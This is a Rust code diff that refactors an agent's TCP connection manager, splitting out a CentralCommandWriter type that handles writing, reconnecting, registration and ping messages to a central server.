@@ -31,16 +31,18 @@ async fn main() -> io::Result<()> {
 }
 
 pub struct ConnectionManager {
-    central_command_stream: TcpStream,
+    central_command_writer: CentralCommandWriter,
 }
 
-impl ConnectionManager {
-    pub async fn try_new() -> io::Result<Self> {
-        let central_command_stream = Self::connect_to_central_command().await?;
+pub struct CentralCommandWriter {
+    stream: TcpStream,
+}
 
-        Ok(Self {
-            central_command_stream,
-        })
+impl CentralCommandWriter {
+    pub async fn try_new() -> Result<Self, io::Error> {
+        let stream = Self::connect_to_central_command().await?;
+
+        Ok(Self { stream })
     }
 
     pub async fn connect_to_central_command() -> io::Result<TcpStream> {
@@ -71,16 +73,11 @@ impl ConnectionManager {
     }
 
     pub async fn reconnect_to_central_command(&mut self) -> io::Result<()> {
-        self.central_command_stream = Self::connect_to_central_command().await?;
+        self.stream = Self::connect_to_central_command().await?;
         Ok(())
     }
 
-    pub async fn register(&mut self) {
-        let message = Message::RegisterAgent(AGENT_STRING.to_string());
-        self.write_to_central_command(message).await;
-    }
-
-    pub async fn write_to_central_command(&mut self, message: Message) {
+    pub async fn write(&mut self, message: Message) {
         let serialized: Vec<u8> = match message.try_into() {
             Ok(msg) => msg,
             Err(e) => {
@@ -88,23 +85,31 @@ impl ConnectionManager {
                 return;
             }
         };
-        match self.central_command_stream.write_all(&serialized).await {
-            Ok(_) => {
-                info!("Message sent to central command.");
-            }
-            Err(e) => {
-                error!("Error writing to central command: {}", e);
-                // Attempt to reconnect if the connection is lost
-                if let Err(e) = self.reconnect_to_central_command().await {
-                    error!("Failed to reconnect: {}", e);
-                }
+
+        if let Err(e) = self.stream.write_all(&serialized).await {
+            error!("Error writing to central command: {}", e);
+            if let Err(e) = self.reconnect_to_central_command().await {
+                error!("Failed to reconnect to central command: {}", e);
             }
         }
+    }
+}
+
+impl ConnectionManager {
+    pub async fn try_new() -> io::Result<Self> {
+        Ok(Self {
+            central_command_writer: CentralCommandWriter::try_new().await?,
+        })
+    }
+
+    pub async fn register(&mut self) {
+        let message = Message::RegisterAgent(AGENT_STRING.to_string());
+        self.central_command_writer.write(message).await;
     }
 
     pub async fn ping_central_command(&mut self) {
         let message = Message::Ping;
-        self.write_to_central_command(message).await;
+        self.central_command_writer.write(message).await;
     }
 
     pub async fn listen(&mut self) -> io::Result<()> {
